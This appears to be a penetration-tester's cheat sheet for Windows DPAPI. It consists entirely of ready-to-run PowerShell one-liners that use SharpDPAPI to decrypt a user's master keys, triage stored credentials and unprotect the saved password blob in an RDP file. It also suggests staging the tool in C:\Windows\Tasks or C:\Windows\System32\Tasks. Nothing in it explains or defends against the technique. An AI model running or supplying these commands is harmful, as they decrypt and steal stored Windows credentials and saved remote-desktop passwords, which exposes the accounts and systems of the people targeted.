# DPAPI
#target/local #os/windows

## All in one
```
<working_dir>\SharpDPAPI.exe triage $(<working_dir>\SharpDPAPI.exe masterkeys /target:$env:APPDATA\Microsoft\Protect\$([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) /sid:$([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) /password:<password> | sls -Pattern '({[0-9A-Fa-f-]+}:[0-9A-F]+)' | % { $_.Matches[0].Value })
```

## Decrypt master keys
```
<working_dir>\SharpDPAPI.exe masterkeys /target:$env:APPDATA\Microsoft\Protect\$([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) /sid:$([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) /password:<password>
```

## Locate/validate master keys
```
<working_dir>\SharpDPAPI.exe triage '<master_key_cache>'
```

## Decrypt RDP file as administrator
```
$rdp='<rdp_file>'; $m=Select-String -Path $rdp -Pattern '^password 51:b:([0-9A-Fa-f]+)$'; if(!$m){throw 'no blob'}; $h=$m.Matches[0].Groups[1].Value; $b=New-Object byte[] ($h.Length/2); for($i=0;$i -lt $h.Length;$i+=2){$b[$i/2]=[Convert]::ToByte($h.Substring($i,2),16)}; $b64=[Convert]::ToBase64String($b); <working_dir>\SharpDPAPI.exe blob /target:$b64 /unprotect
```


- working_dir
C:\Windows\Tasks
C:\Windows\System32\Tasks
